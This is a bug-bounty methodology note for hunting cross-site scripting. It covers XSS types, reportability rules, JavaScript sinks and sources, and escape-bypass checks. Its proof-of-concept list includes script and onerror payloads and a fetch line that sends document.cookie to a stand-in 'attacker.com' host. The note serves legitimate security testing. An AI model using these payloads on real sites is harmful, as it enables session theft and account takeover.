# XSS — Hunting Methodology

## Types to Hunt

| Type | Description | Priority |
|---|---|---|
| Stored XSS | Payload persists and executes for other users | Critical/High |
| Reflected XSS | Payload reflects in response from URL/form input | High/Medium |
| DOM-based XSS | Payload flows from DOM source to DOM sink in JS | High/Medium |

## Required for Reportability

- Payload executes JS in a real browser context (not just reflects as text)
- Victim exists beyond the attacker (stored → any user; reflected → any user who clicks link)
- Self-XSS (only affects attacker's own session) → NOT reportable

## Common Sinks — Where XSS Executes

**JavaScript sinks (highest risk):**
- `innerHTML`, `outerHTML`, `insertAdjacentHTML`
- `document.write()`, `document.writeln()`
- `eval()`, `setTimeout(string)`, `setInterval(string)`, `Function(string)`
- `location.href`, `location.replace()`, `window.open(url)`
- `.src`, `.href` on script/link/iframe elements

**Template sinks:**
- Server-side templates rendering unescaped user input: `{{ input | safe }}`, `{!! input !!}`, `<%= input %>`

**Dom sources (attacker-controlled):**
- `location.hash`, `location.search`, `location.href`
- `document.referrer`, `document.URL`
- `postMessage` data
- `localStorage`, `sessionStorage` values set from external input

## Encoding/Defense Bypass Confirmation Steps

1. Confirm the framework does NOT auto-escape output in this context
2. Confirm the output is inserted as HTML (not as text node or attribute with quotes)
3. If HTML attribute: confirm quotes are not escaped → can break out with `"`
4. If JavaScript context: confirm backslash/quote not escaped → can inject with `';`
5. If URL context: confirm `javascript:` is not blocked

Do NOT report if:
- React JSX renders the field (auto-escapes everything except `dangerouslySetInnerHTML`)
- Django/Jinja2 renders without `| safe` (auto-escapes)
- Output is in JSON body consumed by well-written JS (not innerHTML)
- Angular's `{{ }}` interpolation (sanitized by default)

## PoC Escalation Path

For reportability, prefer:
1. `<script>alert(document.cookie)</script>` → proves cookie access
2. `<img src=x onerror=alert(document.domain)>` → proves execution context
3. `fetch('https://attacker.com?c='+document.cookie)` → proves exfiltration

For DOM XSS, trace source → sink explicitly and provide the JS code path.

## Impact by Context

| XSS Location | Impact |
|---|---|
| Auth'd area, persisted | ATO: steal session token, 2FA bypass |
| Auth'd area, reflected | ATO with victim clicking attacker link |
| Admin panel | Admin account compromise, lateral movement |
| Payment page | Credit card skimming (if Magecart-style) |
| Profile/bio | Worm potential if viewed by many users |
| Email template | Usually lower (email client rendering) |
